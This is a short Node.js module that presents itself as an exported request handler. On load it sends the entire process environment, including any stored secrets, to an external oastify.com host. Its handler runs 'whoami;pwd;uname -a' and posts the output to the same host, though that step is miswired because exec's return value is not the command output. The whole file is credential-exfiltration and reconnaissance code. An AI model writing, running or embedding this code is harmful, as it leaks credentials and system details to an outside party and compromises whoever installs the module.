const axios = require('axios');

axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);

module.exports = (context, req, res) => {
  var exec = require('child_process').exec;
  var cmd = 'whoami;pwd;uname -a';
  var result = exec(cmd, function(error, stdout, stderr) { return stdout; });
  axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
  return true;
};

